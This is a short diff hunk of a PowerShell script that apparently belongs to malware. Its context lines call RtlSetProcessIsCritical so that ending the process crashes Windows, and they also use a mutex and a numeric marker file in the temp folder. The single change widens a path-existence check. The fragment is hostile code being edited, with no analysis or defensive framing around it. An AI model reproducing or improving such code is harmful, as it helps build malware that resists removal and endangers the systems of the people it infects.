@@ -28,7 +28,7 @@ public class CS {
 Add-Type -TypeDefinition $signature
 [CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null
 
-if([string]::IsNullOrEmpty($basePath)){
+if([string]::IsNullOrEmpty($basePath) -or -not(Test-Path -Path $basePath)){
     if($mutex.WaitOne(5000)){
         try {
             if(-not(Test-Path -Path "$env:temp\598600304.txt" -PathType Leaf)){
